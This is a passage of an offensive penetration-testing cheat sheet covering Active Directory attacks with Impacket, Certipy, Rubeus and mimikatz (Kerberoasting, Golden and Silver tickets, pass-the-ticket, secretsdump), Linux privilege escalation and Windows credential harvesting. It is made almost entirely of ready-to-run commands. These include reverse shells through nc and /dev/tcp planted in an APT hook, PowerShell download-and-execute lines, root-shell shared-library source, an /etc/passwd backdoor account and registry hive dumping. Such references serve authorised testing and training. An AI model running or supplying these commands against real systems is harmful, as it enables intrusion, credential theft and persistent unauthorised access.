bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<OBJECT>$' --attr msDS-ManagedPassword                       // Read GMSA account password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH                                      // Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac <USERNAME> ACCOUNTDISABLE                                     // Disable ACCOUNTDISABLE
```

#### Certify

> https://github.com/GhostPack/Certify

```c
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

#### Certipy

> https://github.com/ly4k/Certipy

> https://github.com/ly4k/BloodHound/

```c
certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
certipy find -dc-ip <RHOST> -u <USERNAME> -p <PASSWORD> -vulnerable -stdout
```

##### Account Creation

```c
certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <RHOST> -user <COMPUTERNAME>
```

##### Authentication

```c
certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
```

###### LDAP-Shell

```c
certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
```

```c
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

##### Certificate Forging

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
```

##### Certificate Request

Run the following command twice because of a current issue with `certipy`.

```c
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
```

```c
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
```

##### Revert Changes

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -dc-ip <RHOST> -configuration <TEMPLATE>.json
```

##### Start BloodHound Fork

```c
./BloodHound --disable-gpu-sandbox
```

#### enum4linux-ng

```c
enum4linux-ng -A <RHOST>
```

#### Evil-WinRM

```c
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

#### Impacket

##### impacket-atexec

```c
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
```

##### impacket-dcomexec

```c
impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug '<DOMAIN>/<USERNAME>':'<PASSWORD>' '<COMMAND>'
impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand '<DOMAIN>/<USERNAME>@<RHOST>' '<COMMAND>'
```

##### impacket-findDelegation

```c
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
```

##### impacket-GetADUsers

```c
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
```

##### impacket-GetNPUsers

```c
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
impacket-GetNPUsers <DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
```

##### impacket-getST

```c
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
```

##### impacket-getTGT

```c
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

##### impacket-getUserSPNs

```c
impacket-GetUserSPNs <DOMAIN>/<USERNAME> -dc-ip <RHOST> -request
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<DOMAIN> -no-pass -request
```

##### impacket-lookupsid

```c
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-netview

```c
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
```

##### impacket-ntlmrelayx

###### Common Commands

```c
impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
```

###### Example

```c
impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA<--- CUT FOR BREVITY --->"
```

```c
dir \\<LHOST>\foobar
```

```c
nc -lnvp <LPORT>
```

##### impacket-psexec

```c
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

##### impacket-req

```c
impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
```

##### impacket-rpcdump

```c
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-samrdump

```c
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

##### impacket-secretsdump

```c
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
```

##### impacket-services

```c
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
```

##### impacket-smbclient

```c
impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
```

##### impacket-smbpasswd

```c
impacket-smbpasswd <RHOST>/<USERNAME>:'<PASSWORD>'@<RHOST> -newpass '<PASSWORD>'
```

##### impacket-smbserver

```c
impacket-smbserver local . -smb2support
```

##### impacket-ticketer

###### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
```

###### Fixing [-] exceptions must derive from BaseException

###### Issue

```c
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

###### To fix it

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

##### dacledit.py

> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

```c
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'read' -principal '<USERNAME>' -target '<GROUP>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>' -k -dc-ip <RHOST> -debug
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <RHOST>
python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '<USERNAME>' -target-dn 'OU=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>' -k -use-ldaps -dc-ip <RHOST>
```

###### Fixing msada_guids Error

```c
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py

##### owneredit.py

> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py

```c
python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
```

##### ThePorgs Fork

```c
pipenv shell
git clone https://github.com/ThePorgs/impacket/
pip3 install -r requirements.txt
sudo python3 setup.py install
```

#### JAWS

```c
IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

#### Kerberos

> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

##### General Notes

- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

##### Bruteforce

```c
./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```

###### With List of Users

```c
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```

###### Check Passwords for all Users in Domain

```c
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

##### ASPREPRoast

###### Check ASPREPRoast for all Domain Users (Credentials required)

```c
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

###### Check ASPREPRoast for a List of Users (No Credentials required)

```c
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

###### Check ASPREPRoast for all Domain Users in Domain

```c
.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

##### Kerberoasting

```c
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
.\Rubeus.exe kerberoast /outfile:<FILE>
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

##### Overpass The Hash/Pass The Key (PTK)

###### Request TGT with Hash

```c
impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

###### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```c
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```

###### Request TGT with Password

```c
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```

###### Set TGT for Impacket Usage

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

###### Ask and inject the Ticket

```c
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

###### Execute a CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Pass The Ticket (PTT)

###### Harvest Tickets from Linux

###### Check Type and Location of Tickets

```c
grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```c
cp tickey /tmp/tickey
/tmp/tickey -i
```

###### Harvest Tickets from Windows

```c
sekurlsa::tickets /export
.\Rubeus dump
```

###### Convert Tickets dumped with Rubeus into base64

```c
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

###### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```c
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

###### Using Ticket on Linux

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

###### Using Ticket on Windows

###### Inject Ticket with mimikatz

```c
kerberos::ptt <KIRBI_FILE>
```

###### Inject Ticket with Rubeus

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute a CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Silver Ticket

###### Impacket Examples

###### Generate TGS with NTLM

```c
python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Generate TGS with aesKey

```c
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Set the ticket for impacket use

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGS with NTLM

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 128bit Key

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Inject TGS with Mimikatz

```c
kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Golden Ticket

###### Impacket Examples

###### Generate TGT with NTLM

```c
python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Generate TGT with aesKey

```c
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Set TGT for Impacket Usage

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGT with NTLM

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

###### Generate TGT with AES 128bit Key

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

###### Inject TGT with Mimikatz

```c
kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

###### Inject Ticket with Rubeus

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

###### Get NTLM from Password

```c
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

#### ldapsearch

```c
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
```

#### Linux

##### Basic Linux Enumeration

```c
id
sudo -l
env
cat ~/.bashrc
cat /etc/passwd
cat /etc/hosts
cat /etc/fstab
lsblk
ls -lah /etc/cron*
crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
dpkg -l
uname -a
```

##### Abusing Password Authentication

```c
openssl passwd <PASSWORD>
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

##### Apache2

###### Read first Line of a File with apache2 Binary

```c
sudo /usr/sbin/apache2 -f <FILE>
```

##### APT

```c
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```

##### arua2c

```c
aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```

##### Bash Debugging Mode

- Bash <4.4

```c
env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

##### Bash Functions

- Bash <4.2-048

```c
function /usr/sbin/<BINARY> { /bin/bash -p; }
export -f /usr/sbin/<BINARY>
/usr/sbin/<BINARY>
```

##### Capabilities

```c
capsh --print
/usr/sbin/getcap -r / 2>/dev/null
```

##### Credential Harvesting

```c
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

##### find Commands

```c
find / -user <USERNAME> -ls 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
find / -group <GROUP> 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -writable -type d 2>/dev/null
find / -cmin -60    // find files changed within the last 60 minutes
find / -amin -60    // find files accesses within the last 60 minutes
find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
```

##### Kernel Exploits

```c
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

##### LD_PRELOAD

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

###### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

or

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

###### Compiling

```c
gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
```

###### Privilege Escalation

```c
sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
```

##### LD_LIBRARY_PATH

###### Get Information about Libraries

```c
ldd /PATH/TO/BINARY/<BINARY>
```

###### shell.c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

###### Compiling

```c
gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
```

###### Privilege Escalation

```c
sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```

##### logrotten

> https://github.com/whotwagner/logrotten

```c
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

###### If "create"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

###### If "compress"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

##### Path Variable Hijacking

```c
find / -perm -u=s -type f 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
export PATH=$(pwd):$PATH
```

##### PHP7.2

```c
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

#### rbash

##### Breakout using $PATH Variable

```c
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

##### Breakouts using less

```c
less /etc/profile
!/bin/sh
```

```c
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```c
less /etc/profile
v:shell
```

##### Breakout using scp

```c
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```

##### Breakouts using vi

```c
vi -c ':!/bin/sh' /dev/null
```

```c
vi
:set shell=/bin/sh
:shell
```

##### Breakouts using SSH Command Execution

```c
ssh <USERNAME>@<RHOST> -t sh
ssh <USERNAME>@<RHOST> -t /bin/sh
ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
```

##### relayd

The binary need to have the `SUID` bit set.

```c
/usr/sbin/relayd -C /etc/shadow
```

##### Shared Library Misconfiguration

> https://tbhaxor.com/exploiting-shared-library-misconfigurations/

###### shell.c

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

###### Compiling

```c
gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
```

##### Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```c
touch -- --checkpoint=1
```

or

```c
touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```c
touch -- '--checkpoint-action=exec=sh shell.sh'
```

or 

```c
touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```c
rm ./'--checkpoint-action=exec=python script.sh'
```

##### Writeable Directories in Linux

```c
/dev/shm
/tmp
```

#### Microsoft Windows

##### Basic Microsoft Windows Enumeration

```c
whoami /all
whoami /user
systeminfo
net accounts
net user
net user /domain
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get LocalGroupMember <GROUP>
Get-Process
tree /f C:\Users\
tasklist /SVC
sc query
sc qc <SERVICE>
netsh firewall show state
schtasks /query /fo LIST /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

##### Access Control

###### S-R-X-Y Example

| Value | Info |
| --- | --- |
| S | SID |
| R | Revision (always set to 1) |
| X | Identifier Authority (5 is the most common one) |
| Y | Sub Authority | 

###### SID Table

| SID | Value |
| --- | --- |
| S-1-0-0 | Nobody |
| S-1-1-0 | Everybody |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-domainidentifier-500 | Administrator |  

##### accesschk

###### Checking File Permissions

```c
.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```

###### Checking Service Permissions

```c
.\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```

###### Checking Path Permissions to find Unquoted Service Paths

```c
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```

###### Checking Registry Entries

```c
.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

##### Show hidden Files and Folders

```c
dir /a      // show hidden folders
dir /a:d    // show all hidden directories
dir /a:h    // show all hidden files
cmd /c dir /A      // show hidden folders
cmd /c dir /A:D    // show all hidden directories
cmd /c dir /A:H    // show all hidden files
powershell ls -force    // show all hidden files
```

##### Show installed Applications

```c
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

##### User Handling

###### Adding Users to Groups

```c
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
net localgroup "Remote Management Users" /add <USERNAME>
```

##### Credential Harvesting

###### Quick Wins

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```c
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

###### Search for Passwords

```c
findstr /si password *.xml *.ini *.txt
dir .s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.vbs -File -Recurse -ErrorAction SilentlyContinue
```

###### PowerShell History

```c
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

###### Saved Windows Credentials

```c
cmdkey /list
runas /savecred /user:<USERNAME> cmd.exe
```

###### Winlogon Credentials

```c
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

###### Local Administrator Password Solution (LAPS)

```c
Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
```

###### Search the Registry for Passwords

```c
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

###### Dumping Credentials

```c
reg save hklm\system system
reg save hklm\sam sam
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

###### Find KeePass Databases

```c
